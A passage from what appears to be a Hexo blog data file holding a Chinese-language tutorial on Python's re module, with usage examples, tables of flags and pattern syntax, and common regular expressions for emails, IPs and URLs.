# 返回第一个分组匹配成功的子串\n'Hello'\n>>> m.span(1)                             # 返回第一个分组匹配成功的子串的索引\n(0, 5)\n>>> m.group(2)                            # 返回第二个分组匹配成功的子串\n'World'\n>>> m.span(2)                             # 返回第二个分组匹配成功的子串\n(6, 11)\n>>> m.groups()                            # 等价于 (m.group(1), m.group(2), ...)\n('Hello', 'World')\n>>> m.group(3)                            # 不存在第三个分组\nTraceback (most recent call last):\n  File \"<stdin>\", line 1, in <module>\nIndexError: no such group\n\n```\n\n### re模块-findall方法\n\n在字符串中找到正则表达式所匹配的所有子串，并返回一个列表，如果没有找到匹配的，则返回空列表。\n\nmatch 和 search  是匹配一次 findall 匹配所有。\n\n语法格式为：\n\n```\nfindall(string[, pos[, endpos]])\n```\n\n参数：\n\n- string : 待匹配的字符串。\n- pos : 可选参数，指定字符串的起始位置，默认为 0。\n- endpos : 可选参数，指定字符串的结束位置，默认为字符串的长度。\n\n查找字符串中的所有数字：\n\n```python\n\n# -*- coding:UTF8 -*-\n \nimport re\n \npattern = re.compile(r'\\d+')   # 查找数字\nresult1 = pattern.findall('runoob 123 google 456')\nresult2 = pattern.findall('run88oob123google456', 0, 10)\n \nprint(result1)\nprint(result2)\n\n```\n\n输出结果：\n\n```\n['123', '456']\n['88', '12']\n```\n\n### re模块-finditer方法\n\n和 findall 类似，在字符串中找到正则表达式所匹配的所有子串，并把它们作为一个迭代器返回。\n\n```\nre.finditer(pattern, string, flags=0)\n```\n\n```\n\n# -*- coding: UTF-8 -*-\n \nimport re\n \nit = re.finditer(r\"\\d+\",\"12a32bc43jf3\") \nfor match in it: \n    print (match.group() )\n\n```\n\n输出结果：\n\n```\n12 \n32 \n43 \n3\n```\n\n### re模块-split方法\n\nsplit 方法按照能够匹配的子串将字符串分割后返回列表，它的使用形式如下：\n\n```\nre.split(pattern, string[, maxsplit=0, flags=0])\n```\n\n```python\n\n>>>import re\n>>> re.split('\\W+', 'runoob, runoob, runoob.')\n['runoob', 'runoob', 'runoob', '']\n>>> re.split('(\\W+)', ' runoob, runoob, runoob.') \n['', ' ', 'runoob', ', ', 'runoob', ', ', 'runoob', '.', '']\n>>> re.split('\\W+', ' runoob, runoob, runoob.', 1) \n['', 'runoob, runoob, runoob.']\n \n>>> re.split('a*', 'hello world')   # 对于一个找不到匹配的字符串而言，split 不会对其作出分割\n['hello world']\n\n```\n\n| 参数     | 描述                                                         |\n| -------- | ------------------------------------------------------------ |\n| pattern  | 匹配的正则表达式                                             |\n| string   | 要匹配的字符串。                                             |\n| maxsplit | 分隔次数，maxsplit=1 分隔一次，默认为 0，不限制次数。        |\n| flags    | 标志位，用于控制正则表达式的匹配方式，如：是否区分大小写，多行匹配等等。 |\n\n## 正则表达式对象\n\n### re.RegexObject\n\nre.compile() 返回 RegexObject 对象。\n\n### re.MatchObject\n\ngroup() 返回被 RE 匹配的字符串。\n\n- start() 返回匹配开始的位置\n- end() 返回匹配结束的位置\n- span() 返回一个元组包含匹配 (开始,结束) 的位置\n\n------\n\n## 正则表达式修饰符 - 可选标志\n\n正则表达式可以包含一些可选标志修饰符来控制匹配的模式。修饰符被指定为一个可选的标志。多个标志可以通过按位 OR(|) 它们来指定。如 re.I | re.M 被设置成 I 和 M 标志：\n\n| 修饰符 | 描述                                                         |\n| ------ | ------------------------------------------------------------ |\n| re.I   | 使匹配对大小写不敏感                                         |\n| re.L   | 做本地化识别（locale-aware）匹配                             |\n| re.M   | 多行匹配，影响 ^ 和 $                                        |\n| re.S   | 使 . 匹配包括换行在内的所有字符                              |\n| re.U   | 根据Unicode字符集解析字符。这个标志影响 \\w, \\W, \\b, \\B.      |\n| re.X   | 该标志通过给予你更灵活的格式以便你将正则表达式写得更易于理解。 |\n\n------\n\n## 正则表达式模式\n\n模式字符串使用特殊的语法来表示一个正则表达式：\n\n字母和数字表示他们自身。一个正则表达式模式中的字母和数字匹配同样的字符串。\n\n多数字母和数字前加一个反斜杠时会拥有不同的含义。\n\n标点符号只有被转义时才匹配自身，否则它们表示特殊的含义。\n\n反斜杠本身需要使用反斜杠转义。\n\n由于正则表达式通常都包含反斜杠，所以你最好使用原始字符串来表示它们。模式元素(如 r'\\t'，等价于 '\\\\t')匹配相应的特殊字符。\n\n下表列出了正则表达式模式语法中的特殊元素。如果你使用模式的同时提供了可选的标志参数，某些模式元素的含义会改变。\n\n| 模式        | 描述                                                         |\n| ----------- | ------------------------------------------------------------ |\n| ^           | 匹配字符串的开头                                             |\n| $           | 匹配字符串的末尾。                                           |\n| .           | 匹配任意字符，除了换行符，当re.DOTALL标记被指定时，则可以匹配包括换行符的任意字符。 |\n| [...]       | 用来表示一组字符,单独列出：[amk] 匹配 'a'，'m'或'k'          |\n| [^...]      | 不在[]中的字符：[^abc] 匹配除了a,b,c之外的字符。             |\n| re*         | 匹配0个或多个的表达式。                                      |\n| re+         | 匹配1个或多个的表达式。                                      |\n| re?         | 匹配0个或1个由前面的正则表达式定义的片段，非贪婪方式         |\n| re{ n}      | 精确匹配 n 个前面表达式。例如， o{2} 不能匹配 \"Bob\" 中的 \"o\"，但是能匹配 \"food\" 中的两个 o。 |\n| re{ n,}     | 匹配 n 个前面表达式。例如， o{2,} 不能匹配\"Bob\"中的\"o\"，但能匹配 \"foooood\"中的所有 o。\"o{1,}\" 等价于 \"o+\"。\"o{0,}\" 则等价于 \"o*\"。 |\n| re{ n, m}   | 匹配 n 到 m 次由前面的正则表达式定义的片段，贪婪方式         |\n| a\\| b       | 匹配a或b                                                     |\n| (re)        | 对正则表达式分组并记住匹配的文本                             |\n| (?imx)      | 正则表达式包含三种可选标志：i, m, 或 x 。只影响括号中的区域。 |\n| (?-imx)     | 正则表达式关闭 i, m, 或 x 可选标志。只影响括号中的区域。     |\n| (?: re)     | 类似 (...), 但是不表示一个组                                 |\n| (?imx: re)  | 在括号中使用i, m, 或 x 可选标志                              |\n| (?-imx: re) | 在括号中不使用i, m, 或 x 可选标志                            |\n| (?#...)     | 注释.                                                        |\n| (?= re)     | 前向肯定界定符。如果所含正则表达式，以 ... 表示，在当前位置成功匹配时成功，否则失败。但一旦所含表达式已经尝试，匹配引擎根本没有提高；模式的剩余部分还要尝试界定符的右边。 |\n| (?! re)     | 前向否定界定符。与肯定界定符相反；当所含表达式不能在字符串当前位置匹配时成功 |\n| (?> re)     | 匹配的独立模式，省去回溯。                                   |\n| \\w          | 匹配字母数字及下划线                                         |\n| \\W          | 匹配非字母数字及下划线                                       |\n| \\s          | 匹配任意空白字符，等价于 [ \\t\\n\\r\\f]。                       |\n| \\S          | 匹配任意非空字符                                             |\n| \\d          | 匹配任意数字，等价于 [0-9].                                  |\n| \\D          | 匹配任意非数字                                               |\n| \\A          | 匹配字符串开始                                               |\n| \\Z          | 匹配字符串结束，如果是存在换行，只匹配到换行前的结束字符串。 |\n| \\z          | 匹配字符串结束                                               |\n| \\G          | 匹配最后匹配完成的位置。                                     |\n| \\b          | 匹配一个单词边界，也就是指单词和空格间的位置。例如， 'er\\b' 可以匹配\"never\" 中的 'er'，但不能匹配 \"verb\" 中的 'er'。 |\n| \\B          | 匹配非单词边界。'er\\B' 能匹配 \"verb\" 中的 'er'，但不能匹配 \"never\" 中的 'er'。 |\n| \\n, \\t, 等. | 匹配一个换行符。匹配一个制表符。等                           |\n| \\1...\\9     | 匹配第n个分组的内容。                                        |\n| \\10         | 匹配第n个分组的内容，如果它经匹配。否则指的是八进制字符码的表达式。 |\n\n------\n\n## 正则表达式实例\n\n#### 字符匹配\n\n| 实例   | 描述           |\n| ------ | -------------- |\n| python | 匹配 \"python\". |\n\n#### 字符类\n\n| 实例        | 描述                              |\n| ----------- | --------------------------------- |\n| [Pp]ython   | 匹配 \"Python\" 或 \"python\"         |\n| rub[ye]     | 匹配 \"ruby\" 或 \"rube\"             |\n| [aeiou]     | 匹配中括号内的任意一个字母        |\n| [0-9]       | 匹配任何数字。类似于 [0123456789] |\n| [a-z]       | 匹配任何小写字母                  |\n| [A-Z]       | 匹配任何大写字母                  |\n| [a-zA-Z0-9] | 匹配任何字母及数字                |\n| [^aeiou]    | 除了aeiou字母以外的所有字符       |\n| [^0-9]      | 匹配除了数字外的字符              |\n\n#### 特殊字符类\n\n| 实例 | 描述                                                         |\n| ---- | ------------------------------------------------------------ |\n| .    | 匹配除 \"\\n\" 之外的任何单个字符。要匹配包括 '\\n' 在内的任何字符，请使用象 '[.\\n]' 的模式。 |\n| \\d   | 匹配一个数字字符。等价于 [0-9]。                             |\n| \\D   | 匹配一个非数字字符。等价于 [^0-9]。                          |\n| \\s   | 匹配任何空白字符，包括空格、制表符、换页符等等。等价于 [ \\f\\n\\r\\t\\v]。 |\n| \\S   | 匹配任何非空白字符。等价于 [^ \\f\\n\\r\\t\\v]。                  |\n| \\w   | 匹配包括下划线的任何单词字符。等价于'[A-Za-z0-9_]'。         |\n| \\W   | 匹配任何非单词字符。等价于 '[^A-Za-z0-9_]'。                 |\n\nw(ﾟДﾟ)w！！！！！！！！\n\n常用正则表达式：\n\n```\nEmail: '[0-9a-zA-Z]+@[0-9a-zA-Z]+\\.[a-zA-Z]{2,3}'\nIp地址: (ipv4)：'\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}'\nWeb地址: 'https?:/{2}\\w.+'\n```\n\n","slug":"py正则表达式","published":1,"date":"2021-06-22T10:40:51.186Z","updated":"2021-06-24T11:15:18.965Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cksan4n9x000brouv8t5f7jg7","content":"<h2 id=\"python\"><a href=\"#python\" class=\"headerlink\" title=\"python\"></a>python</h2><h3 id=\"基础\"><a href=\"#基础\" class=\"headerlink\" title=\"基础\"></a>基础</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">方法、属性、迭代器、生成器、异常、类和对象、函数、字典、列表、元组、字符串、条件循环等其他语句；</span><br></pre></td></tr></table></figure>\n\n<p>开始进阶@O(∩_∩)O@</p>\n<h3 id=\"正则表达式-元字符\"><a href=\"#正则表达式-元字符\" class=\"headerlink\" title=\"正则表达式-元字符\"></a>正则表达式-元字符</h3><p><img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210623212648037.png\" alt=\"image-20210623212648037\"></p>\n<h3 id=\"正则表达式-重复\"><a href=\"#正则表达式-重复\" class=\"headerlink\" title=\"正则表达式-重复\"></a>正则表达式-重复</h3><p><img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210623213058621.png\" alt=\"image-20210623213058621\"></p>\n<h3 id=\"正则表达式-反义\"><a href=\"#正则表达式-反义\" class=\"headerlink\" title=\"正则表达式-反义\"></a>正则表达式-反义</h3><p><img src=\"C:\\Users\\86153\\AppData\\Roaming\\Typora\\typora-user-images\\image-20210623214030452.png\" alt=\"image-20210623214030452\"></p>\n<h3 id=\"re模块-match方法\"><a href=\"#re模块-match方法\" class=\"headerlink\" title=\"re模块-match方法\"></a>re模块-match方法</h3><p>re.match 尝试从字符串的起始位置匹配一个模式，如果不是起始位置匹配成功的话，match()就返回none。</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">re.match(pattern, string, flags=<span class=\"number\">0</span>)   <span class=\"comment\">#函数语法</span></span><br></pre></td></tr></table></figure>\n\n<p>函数参数说明：</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">参数</th>\n<th align=\"center\">描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">pattern</td>\n<td align=\"center\">匹配的正则表达式</td>\n</tr>\n<tr>\n<td align=\"center\">string</td>\n<td align=\"center\">要匹配的字符串</td>\n</tr>\n<tr>\n<td align=\"center\">flags</td>\n<td align=\"center\">标志位，用于控制正则表达式的匹配方式，如：是否区分大小写，多行匹配等等。</td>\n</tr>\n</tbody></table>\n<p>匹配成功re.match方法返回一个匹配的对象，否则返回None。</p>\n<p>我们可以使用group(num) 或  groups() 匹配对象函数来获取匹配表达式。</p>\n<table>\n<thead>\n<tr>\n<th align=\"center\">匹配对象方法</th>\n<th align=\"center\">描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">group(num=0)</td>\n<td align=\"center\">匹配的整个表达式的字符串，group() 可以一次输入多个组号，在这种情况下它将返回一个包含那些组所对应值的元组</td>\n</tr>\n<tr>\n<td align=\"center\">groups()</td>\n<td align=\"center\">返回一个包含所有小组字符串的元组，从 1 到 所含的小组号</td>\n</tr>\n</tbody></table>\n<p>实例：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/python</span></span><br><span class=\"line\"><span class=\"comment\"># -*- coding: UTF-8 -*- </span></span><br><span class=\"line\"> <span class=\"keyword\">import</span> re</span><br><span class=\"line\"><span class=\"built_in\">print</span>(re.match(<span class=\"string\">&#x27;www&#x27;</span>, <span class=\"string\">&#x27;www.fbc123.com&#x27;</span>).span())  <span class=\"comment\"># 在起始位置匹配</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(re.match(<span class=\"string\">&#x27;com&#x27;</span>, <span class=\"string\">&#x27;www.fbc123.com&#x27;</span>))         <span class=\"comment\"># 不在起始位置匹配</span></span><br></pre></td></tr></table></figure>\n\n<p>以上实例运行输出结果为：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">(0, 3)</span><br><span class=\"line\">None</span><br></pre></td></tr></table></figure>\n\n<p>实例：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#!/usr/bin/python</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"> </span><br><span class=\"line\">line = <span class=\"string\">&quot;Cats are smarter than dogs&quot;</span></span><br><span class=\"line\"> </span><br><span class=\"line\">matchObj = re.match( <span class=\"string\">r&#x27;(.*) are (.*?) .*&#x27;</span>, line, re.M|re.I)</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"keyword\">if</span> matchObj:</span><br><span class=\"line\">   <span class=\"built_in\">print</span> <span class=\"string\">&quot;matchObj.group() : &quot;</span>, matchObj.group()</span><br><span class=\"line\">   <span class=\"built_in\">print</span> <span class=\"string\">&quot;matchObj.group(1) : &quot;</span>, matchObj.group(<span class=\"number\">1</span>)</span><br><span class=\"line\">   <span class=\"built_in\">print</span> <span class=\"string\">&quot;matchObj.group(2) : &quot;</span>, matchObj.group(<span class=\"number\">2</span>)</span><br><span class=\"line\"><span class=\"keyword\">else</span>:</span><br><span class=\"line\">   <span class=\"built_in\">print</span> <span class=\"string\">&quot;No match!!&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>以上实例执行结果如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">matchObj.group() :  Cats are smarter than dogs</span><br><span class=\"line\">matchObj.group(1) :  Cats</span><br><span class=\"line\">matchObj.group(2) :  smarter</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"re模块-search方法\"><a href=\"#re模块-search方法\" class=\"headerlink\" title=\"re模块-search方法\"></a>re模块-search方法</h3><p>re.search 扫描整个字符串并返回第一个成功的匹配。</p>\n<p>函数语法：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">re.search(pattern, string, flags=0)</span><br></pre></td></tr></table></figure>\n\n<p>函数参数说明：</p>\n<table>\n<thead>\n<tr>\n<th>参数</th>\n<th align=\"center\">描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>pattern</td>\n<td align=\"center\">匹配的正则表达式</td>\n</tr>\n<tr>\n<td>string</td>\n<td align=\"center\">要匹配的字符串</td>\n</tr>\n<tr>\n<td>flags</td>\n<td align=\"center\">标志位，用于控制正则表达式的匹配方式，如：是否区分大小写，多行匹配等等</td>\n</tr>\n</tbody></table>\n<p>匹配成功re.search方法返回一个匹配的对象，否则返回None。</p>\n<p>我们可以使用group(num) 或  groups() 匹配对象函数来获取匹配表达式</p>\n<table>\n<thead>\n<tr>\n<th>匹配对象方法</th>\n<th>描述</th>\n</tr>\n</thead>\n<tbody><tr>\n<td>group(num=0)</td>\n<td>匹配的整个表达式的字符串，group() 可以一次输入多个组号，在这种情况下它将返回一个包含那些组所对应值的元组。</td>\n</tr>\n<tr>\n<td>groups()</td>\n<td>返回一个包含所有小组字符串的元组，从 1 到 所含的小组号。</td>\n</tr>\n</tbody></table>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/python</span></span><br><span class=\"line\"><span class=\"comment\"># -*- coding: UTF-8 -*-  </span></span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"><span class=\"built_in\">print</span>(re.search(<span class=\"string\">&#x27;www&#x27;</span>, <span class=\"string\">&#x27;www.fbc123.com&#x27;</span>).span())  <span class=\"comment\"># 在起始位置匹配</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(re.search(<span class=\"string\">&#x27;com&#x27;</span>, <span class=\"string\">&#x27;www.fbc123.com&#x27;</span>).span())  <span class=\"comment\"># 不在起始位置匹配</span></span><br></pre></td></tr></table></figure>\n\n<p>以上实例运行输出结果为：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">(0, 3)</span><br><span class=\"line\">(11, 14)</span><br></pre></td></tr></table></figure>\n\n<p>实例：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#!/usr/bin/python</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"> </span><br><span class=\"line\">line = <span class=\"string\">&quot;Cats are smarter than dogs&quot;</span>;</span><br><span class=\"line\"> </span><br><span class=\"line\">searchObj = re.search( <span class=\"string\">r&#x27;(.*) are (.*?) .*&#x27;</span>, line, re.M|re.I)</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"keyword\">if</span> searchObj:</span><br><span class=\"line\">   <span class=\"built_in\">print</span> <span class=\"string\">&quot;searchObj.group() : &quot;</span>, searchObj.group()</span><br><span class=\"line\">   <span class=\"built_in\">print</span> <span class=\"string\">&quot;searchObj.group(1) : &quot;</span>, searchObj.group(<span class=\"number\">1</span>)</span><br><span class=\"line\">   <span class=\"built_in\">print</span> <span class=\"string\">&quot;searchObj.group(2) : &quot;</span>, searchObj.group(<span class=\"number\">2</span>)</span><br><span class=\"line\"><span class=\"keyword\">else</span>:</span><br><span class=\"line\">   <span class=\"built_in\">print</span> <span class=\"string\">&quot;Nothing found!!&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>以上实例执行结果如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">searchObj.group() :  Cats are smarter than dogs</span><br><span class=\"line\">searchObj.group(1) :  Cats</span><br><span class=\"line\">searchObj.group(2) :  smarter</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"re-match与re-search的区别\"><a href=\"#re-match与re-search的区别\" class=\"headerlink\" title=\"re.match与re.search的区别\"></a>re.match与re.search的区别</h3><p>re.match只匹配字符串的开始，如果字符串开始不符合正则表达式，则匹配失败，函数返回None；而re.search匹配整个字符串，直到找到一个匹配。</p>\n<p>实例：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/python</span></span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"> </span><br><span class=\"line\">line = <span class=\"string\">&quot;Cats are smarter than dogs&quot;</span>;</span><br><span class=\"line\"> </span><br><span class=\"line\">matchObj = re.match( <span class=\"string\">r&#x27;dogs&#x27;</span>, line, re.M|re.I)</span><br><span class=\"line\"><span class=\"keyword\">if</span> matchObj:</span><br><span class=\"line\">   <span class=\"built_in\">print</span> <span class=\"string\">&quot;match --&gt; matchObj.group() : &quot;</span>, matchObj.group()</span><br><span class=\"line\"><span class=\"keyword\">else</span>:</span><br><span class=\"line\">   <span class=\"built_in\">print</span> <span class=\"string\">&quot;No match!!&quot;</span></span><br><span class=\"line\"> </span><br><span class=\"line\">matchObj = re.search( <span class=\"string\">r&#x27;dogs&#x27;</span>, line, re.M|re.I)</span><br><span class=\"line\"><span class=\"keyword\">if</span> matchObj:</span><br><span class=\"line\">   <span class=\"built_in\">print</span> <span class=\"string\">&quot;search --&gt; searchObj.group() : &quot;</span>, matchObj.group()</span><br><span class=\"line\"><span class=\"keyword\">else</span>:</span><br><span class=\"line\">   <span class=\"built_in\">print</span> <span class=\"string\">&quot;No match!!&quot;</span></span><br></pre></td></tr></table></figure>\n\n<p>以上实例运行结果如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">No match!!</span><br><span class=\"line\">search --&gt; searchObj.group() :  dogs</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"检索和替换\"><a href=\"#检索和替换\" class=\"headerlink\" title=\"检索和替换\"></a>检索和替换</h3><p>Python 的 re 模块提供了re.sub用于替换字符串中的匹配项。</p>\n<p>语法：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">re.sub(pattern, repl, string, count=<span class=\"number\">0</span>, flags=<span class=\"number\">0</span>)</span><br></pre></td></tr></table></figure>\n\n<p>参数：</p>\n<ul>\n<li>pattern : 正则中的模式字符串。</li>\n<li>repl : 替换的字符串，也可为一个函数。</li>\n<li>string : 要被查找替换的原始字符串。</li>\n<li>count : 模式匹配后替换的最大次数，默认 0 表示替换所有的匹配。</li>\n</ul>\n<p>实例：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#!/usr/bin/python</span></span><br><span class=\"line\"><span class=\"comment\"># -*- coding: UTF-8 -*-</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"> </span><br><span class=\"line\">phone = <span class=\"string\">&quot;2004-959-559 # 这是一个国外电话号码&quot;</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># 删除字符串中的 Python注释 </span></span><br><span class=\"line\">num = re.sub(<span class=\"string\">r&#x27;#.*$&#x27;</span>, <span class=\"string\">&quot;&quot;</span>, phone)</span><br><span class=\"line\"><span class=\"built_in\">print</span> <span class=\"string\">&quot;电话号码是: &quot;</span>, num</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># 删除非数字(-)的字符串 </span></span><br><span class=\"line\">num = re.sub(<span class=\"string\">r&#x27;\\D&#x27;</span>, <span class=\"string\">&quot;&quot;</span>, phone)</span><br><span class=\"line\"><span class=\"built_in\">print</span> <span class=\"string\">&quot;电话号码是 : &quot;</span>, num</span><br></pre></td></tr></table></figure>\n\n<p>以上实例执行结果如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">电话号码是:  2004-959-559 </span><br><span class=\"line\">电话号码是 :  2004959559</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"repl-参数是一个函数\"><a href=\"#repl-参数是一个函数\" class=\"headerlink\" title=\"repl 参数是一个函数\"></a>repl 参数是一个函数</h3><p>以下实例中将字符串中的匹配的数字乘以 2：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#!/usr/bin/python</span></span><br><span class=\"line\"><span class=\"comment\"># -*- coding: UTF-8 -*-</span></span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"keyword\">import</span> re</span><br><span class=\"line\"> </span><br><span class=\"line\"><span class=\"comment\"># 将匹配的数字乘以 2</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">double</span>(<span class=\"params\">matched</span>):</span></span><br><span class=\"line\">    value = <span class=\"built_in\">int</span>(matched.group(<span class=\"string\">&#x27;value&#x27;</span>))</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"built_in\">str</span>(value * <span class=\"number\">2</span>)</span><br><span class=\"line\"> </span><br><span class=\"line\">s = <span class=\"string\">&#x27;A23G4HFD567&#x27;</span></span><br><span class=\"line\"><span class=\"built_in\">print</span>(re.sub(<span class=\"string\">&#x27;(?P&lt;value&gt;\\d+)&#x27;</span>, double, s))</span><br></pre></td></tr></table></figure>\n\n<p>执行输出结果为：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">A46G8HFD1134</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"re模块-compile方法\"><a href=\"#re模块-compile方法\" class=\"headerlink\" title=\"re模块-compile方法\"></a>re模块-compile方法</h3><p>compile 函数用于编译正则表达式，生成一个正则表达式（ Pattern ）对象，供 match() 和 search() 这两个函数使用。</p>\n<p>语法格式为：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">re.compile(pattern[, flags])</span><br></pre></td></tr></table></figure>\n\n<p>参数：</p>\n<ul>\n<li><p>pattern : 一个字符串形式的正则表达式</p>\n</li>\n<li><p>flags : 可选，表示匹配模式，比如忽略大小写，多行模式等，具体参数为：</p>\n<ol>\n<li><p><strong>re.I</strong> 忽略大小写</p>\n</li>\n<li><p><strong>re.L</strong> 表示特殊字符集 \\w, \\W, \\b, \\B, \\s, \\S 依赖于当前环境</p>\n</li>\n<li><p><strong>re.M</strong> 多行模式</p>\n</li>\n<li><p><strong>re.S</strong> 即为 . 并且包括换行符在内的任意字符（. 不包括换行符）</p>\n</li>\n<li><p><strong>re.U</strong> 表示特殊字符集 \\w, \\W, \\b, \\B, \\d, \\D, \\s, \\S 依赖于 Unicode 字符属性数据库</p>\n</li>\n<li><p><strong>re.X</strong> 为了增加可读性，忽略空格和 # 后面的注释</p>\n</li>\n</ol>\n</li>\n</ul>\n<p>实例：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span 